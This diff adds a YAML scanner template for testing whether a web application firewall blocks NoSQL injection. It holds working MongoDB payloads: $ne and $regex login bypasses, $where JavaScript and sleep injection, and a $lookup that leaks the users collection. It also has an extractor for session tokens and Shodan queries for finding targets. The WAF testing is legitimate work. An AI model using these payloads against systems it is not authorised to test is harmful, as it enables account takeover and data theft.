@@ -1,0 +1,166 @@
+id: waf-nosqli-bypass
+info:
+  name: WAF NoSQL Injection Bypass
+  author: waftester
+  severity: high
+  description: |
+    Tests WAF effectiveness against NoSQL injection bypass techniques. Targets
+    MongoDB operator injection, JavaScript injection, JSON body manipulation,
+    regex-based authentication bypass, CouchDB injection, and query operator
+    abuse via both GET parameters and POST JSON bodies.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/nosql-injection
+    - https://github.com/0xInfection/Awesome-WAF
+  tags: nosqli,waf,bypass,mongodb,couchdb,owasp-a03,injection,waftester
+  classification:
+    cwe-id:
+      - CWE-943
+      - CWE-693
+  metadata:
+    verified: true
+    max-request: 18
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # MongoDB operator injection via query params
+  - method: GET
+    path:
+      - "{{BaseURL}}/?username[$ne]=&password[$ne]="
+      - "{{BaseURL}}/?username[$gt]=&password[$gt]="
+      - "{{BaseURL}}/?username[$regex]=.*&password[$regex]=.*"
+      - "{{BaseURL}}/?username[$nin][]=admin&password[$ne]="
+      - "{{BaseURL}}/?username[$exists]=true&password[$exists]=true"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 || status_code == 302"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(token|session|jwt|auth|welcome|dashboard)"
+
+  # MongoDB JSON body injection - authentication bypass
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    headers:
+      Content-Type: "application/json"
+    body: '{"username":{"$ne":""},"password":{"$ne":""}}'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # MongoDB regex auth bypass
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+    headers:
+      Content-Type: "application/json"
+    body: '{"username":{"$regex":"admin.*"},"password":{"$regex":".*"}}'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # JavaScript injection in MongoDB $where
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/search"
+    headers:
+      Content-Type: "application/json"
+    body: '{"$where":"this.username == this.password"}'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # MongoDB $where with sleep for time-based detection
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/search"
+    headers:
+      Content-Type: "application/json"
+    body: '{"$where":"sleep(3000)"}'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # MongoDB aggregation pipeline injection
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/data"
+    headers:
+      Content-Type: "application/json"
+    body: '[{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"leaked"}}]'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
